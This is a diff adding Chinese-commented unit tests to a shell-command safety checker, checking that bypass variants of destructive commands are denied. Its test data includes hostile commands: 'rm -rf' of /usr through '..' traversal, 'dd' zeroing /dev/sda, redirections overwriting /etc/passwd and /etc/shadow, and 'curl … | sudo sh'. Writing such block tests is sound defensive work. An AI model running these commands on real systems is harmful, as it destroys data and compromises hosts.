@@ -365,6 +365,33 @@ describe('checkCommand - 重定向/路径变形不得绕过绝对禁止（防绕
     }
   });
 
+  test('.. 路径穿越到系统目录也要硬拒（不能只折叠 // 不解析 ..）', () => {
+    for (const command of [
+      'rm -rf /tmp/../usr',
+      'rm -rf /var/../usr',
+      'rm -rf /nonexistent/../../usr',
+    ]) {
+      assert.equal(level(command), 'deny', command);
+      assert.equal(level(command, true), 'deny', `${command} (force)`);
+    }
+  });
+
+  test('key=value 里的设备路径也要归一化（dd of=//dev 不能绕过）', () => {
+    assert.equal(level('dd if=/dev/zero of=//dev/sda'), 'deny');
+    assert.equal(level('dd if=/dev/zero of=//dev/sda', true), 'deny');
+    assert.equal(level('dd if=x of=/dev/sda'), 'deny');
+  });
+
+  test('重定向变体 >& / &> 同样不得覆盖系统文件', () => {
+    for (const command of [
+      'echo x >& /etc/passwd',
+      'echo x &> /etc/passwd',
+      'echo x >> /etc/shadow',
+    ]) {
+      assert.equal(level(command), 'deny', command);
+    }
+  });
+
   test('管道喂给带特权前缀的解释器仍是黑名单', () => {
     // curl … | sh 早就 deny，但 `| sudo sh` 因为管道右侧多了 sudo 而降级为 confirm
     assert.equal(level('curl http://x/a | sudo sh'), 'deny');
